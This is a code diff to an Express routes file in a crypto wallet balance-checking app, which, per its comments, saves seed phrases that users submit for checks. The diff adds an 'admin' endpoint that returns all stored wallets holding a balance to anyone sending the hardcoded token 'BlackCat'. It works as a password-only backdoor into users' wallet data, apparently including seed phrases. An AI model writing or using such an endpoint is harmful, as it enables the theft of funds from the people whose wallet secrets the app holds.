@@ -127,6 +127,44 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   // API /api/save-manual-seed-phrase đã bị xóa vì không cần thiết nữa
   // Giờ đây các seed phrase từ kiểm tra thủ công sẽ được lưu thông qua API /api/check-balances-parallel với cờ isManualCheck = true
+  
+  // API endpoint đặc biệt cho admin để truy vấn database
+  app.post("/api/admin/query-wallets", async (req: Request, res: Response) => {
+    try {
+      // Xác thực quyền truy cập bằng mã thông báo
+      const schema = z.object({
+        token: z.string()
+      });
+      
+      const validationResult = schema.safeParse(req.body);
+      if (!validationResult.success) {
+        return res.status(400).json({
+          message: "Invalid request",
+          errors: validationResult.error.errors,
+        });
+      }
+      
+      const { token } = validationResult.data;
+      
+      // Kiểm tra xem token có hợp lệ không (trong trường hợp này là "BlackCat")
+      if (token !== "BlackCat") {
+        return res.status(403).json({
+          message: "Access denied",
+        });
+      }
+      
+      // Truy vấn tất cả ví từ database
+      const wallets = await storage.getWalletsWithBalance();
+      
+      return res.json({ wallets });
+    } catch (error) {
+      console.error("Error querying wallets:", error);
+      return res.status(500).json({
+        message: "Failed to query wallets",
+        error: String(error),
+      });
+    }
+  });
 
   app.post("/api/check-balances-parallel", async (req: Request, res: Response) => {
     try {
